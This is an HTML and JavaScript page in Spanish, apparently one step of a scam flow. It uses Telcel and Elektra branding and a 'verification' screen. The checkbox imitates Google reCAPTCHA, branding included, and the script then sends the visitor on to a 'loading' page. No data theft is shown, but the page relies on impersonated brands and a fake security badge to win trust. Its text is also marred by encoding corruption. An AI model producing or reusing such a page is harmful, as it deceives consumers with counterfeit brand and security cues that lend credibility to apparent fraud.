<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Verificaci√≥n ‚Äî Telcel x Elektra</title>
    <link href="https://fonts.googleapis.com/css2?family=Black+Han+Sans&family=Nunito:wght@400;600;700;900&display=swap"
        rel="stylesheet" />
    <style>
        :root {
            --telcel-blue: #0033A0;
            --telcel-blue-light: #0055CC;
            --elektra-yellow: #FFD700;
            --elektra-red: #CC0000;
            --white: #ffffff;
            --gray-light: #f4f6fb;
            --gray: #8a9ab5;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Nunito', sans-serif;
            background: linear-gradient(160deg, #001f6e, #0a0a1a);
            color: #1a1a2e;
            overflow-x: hidden;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 90px 20px 40px;
        }

        /* ‚îÄ‚îÄ LOGOS HEADER ‚îÄ‚îÄ */
        .logos-bar {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 24px 20px 20px;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            z-index: 10;
        }

        .logo-badge {
            background: var(--white);
            border-radius: 10px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 40px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        .logo-badge.elektra {
            background: var(--elektra-yellow);
        }

        .logo-badge img {
            max-height: 100%;
            width: auto;
            display: block;
        }

        .x-separator {
            color: rgba(255, 255, 255, 0.6);
            font-size: 20px;
            font-weight: 900;
        }

        /* ‚îÄ‚îÄ‚îÄ CAPTCHA SCREEN ‚îÄ‚îÄ‚îÄ */
        .captcha-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 36px 28px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .captcha-icon {
            width: 64px;
            height: 64px;
            background: rgba(255, 215, 0, 0.15);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
        }

        .captcha-title {
            font-family: 'Black Han Sans', sans-serif;
            color: white;
            font-size: 22px;
            margin-bottom: 8px;
        }

        .captcha-sub {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            margin-bottom: 28px;
        }

        /* Math captcha */
        .math-captcha {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
        }

        .math-question {
            font-family: 'Black Han Sans', sans-serif;
            font-size: 36px;
            color: var(--elektra-yellow);
            margin-bottom: 16px;
        }

        .math-input {
            width: 100%;
            padding: 14px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-family: 'Black Han Sans', sans-serif;
            font-size: 24px;
            text-align: center;
            outline: none;
            transition: border-color 0.2s;
        }

        .math-input:focus {
            border-color: var(--elektra-yellow);
        }

        /* Checkbox captcha style */
        .checkbox-row {
            display: flex;
            align-items: center;
            gap: 14px;
            background: white;
            border-radius: 8px;
            padding: 16px 18px;
            cursor: pointer;
            margin-bottom: 20px;
            border: 2px solid #ddd;
            transition: border-color 0.2s;
        }

        .checkbox-row:hover {
            border-color: var(--telcel-blue);
        }

        .checkbox-box {
            width: 24px;
            height: 24px;
            border: 2px solid #aaa;
            border-radius: 4px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .checkbox-box.checked {
            background: var(--telcel-blue);
            border-color: var(--telcel-blue);
        }

        .checkbox-box.checked::after {
            content: '‚úì';
            color: white;
            font-size: 14px;
            font-weight: 900;
        }

        .checkbox-text {
            font-size: 15px;
            color: #333;
            font-weight: 700;
        }

        .recaptcha-branding {
            font-size: 10px;
            color: #aaa;
            text-align: right;
            flex: 1;
        }

        .recaptcha-branding span {
            display: block;
            font-weight: 700;
            color: #777;
        }

        .btn-verify {
            width: 100%;
            padding: 16px;
            background: var(--telcel-blue);
            color: white;
            font-family: 'Black Han Sans', sans-serif;
            font-size: 18px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.2s, transform 0.15s;
        }

        .btn-verify:hover {
            background: var(--telcel-blue-light);
            transform: translateY(-2px);
        }

        .btn-verify:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none;
        }

        .captcha-error {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }

        .captcha-error.show {
            display: block;
        }
    </style>
</head>

<body>

    <!-- Logos Global Header -->
    <div class="logos-bar">
        <div class="logo-badge telcel">
            <img src="../assets/Telcel_logo.svg.webp" alt="Telcel" />
        </div>
        <span class="x-separator">√ó</span>
        <div class="logo-badge elektra">
            <img src="../assets/Elektra_Logo.webp" alt="Elektra" />
        </div>
    </div>

    <!-- ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
     SECCI√ìN 2: CAPTCHA
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê -->
    <div class="captcha-card">
        <div class="captcha-icon">ü§ñ</div>
        <h2 class="captcha-title">Verificaci√≥n r√°pida</h2>
        <p class="captcha-sub">Confirma que eres una persona real para continuar</p>

        <!-- Checkbox estilo reCAPTCHA -->
        <div class="checkbox-row" onclick="toggleCheckbox()" id="captcha-checkbox-row">
            <div class="checkbox-box" id="captcha-checkbox"></div>
            <span class="checkbox-text">No soy un robot</span>
            <div class="recaptcha-branding">
                <span>reCAPTCHA</span>
                Privacidad ¬∑ T√©rminos
            </div>
        </div>

        <!-- Math captcha -->
        <div class="math-captcha">
            <div class="math-question" id="math-question">¬øCu√°nto es <span id="math-num1"></span> + <span
                    id="math-num2"></span>?</div>
            <input type="number" class="math-input" id="math-answer" placeholder="Tu respuesta" />
        </div>

        <button class="btn-verify" id="btn-verify" onclick="verifyCaptcha()" disabled>
            Verificar y continuar
        </button>
        <p class="captcha-error" id="captcha-error">‚ùå Respuesta incorrecta. Intenta de nuevo.</p>
    </div>

    <script>
        let checkboxChecked = false;
        let mathAnswer = 0;

        function generateMathCaptcha() {
            const n1 = Math.floor(Math.random() * 9) + 1;
            const n2 = Math.floor(Math.random() * 9) + 1;
            mathAnswer = n1 + n2;
            document.getElementById('math-num1').textContent = n1;
            document.getElementById('math-num2').textContent = n2;
            document.getElementById('math-answer').value = '';
            checkboxChecked = false;
            document.getElementById('captcha-checkbox').classList.remove('checked');
            document.getElementById('btn-verify').disabled = true;
        }

        function toggleCheckbox() {
            checkboxChecked = !checkboxChecked;
            const box = document.getElementById('captcha-checkbox');
            if (checkboxChecked) {
                box.classList.add('checked');
            } else {
                box.classList.remove('checked');
            }
            updateVerifyBtn();
        }

        document.addEventListener('DOMContentLoaded', () => {
            generateMathCaptcha();
            const mathInput = document.getElementById('math-answer');
            if (mathInput) {
                mathInput.addEventListener('input', updateVerifyBtn);
            }
        });

        function updateVerifyBtn() {
            const answer = document.getElementById('math-answer').value;
            const btn = document.getElementById('btn-verify');
            btn.disabled = !(checkboxChecked && answer !== '');
        }

        function verifyCaptcha() {
            const answer = parseInt(document.getElementById('math-answer').value);
            const errEl = document.getElementById('captcha-error');
            if (!checkboxChecked) {
                errEl.textContent = '‚ö†Ô∏è Confirma que no eres un robot.';
                errEl.classList.add('show'); return;
            }
            if (answer !== mathAnswer) {
                errEl.textContent = '‚ùå Respuesta incorrecta. Intenta de nuevo.';
                errEl.classList.add('show');
                generateMathCaptcha(); return;
            }
            errEl.classList.remove('show');
            window.location.href = 'loading.html';
        }
    </script>
</body>

</html>
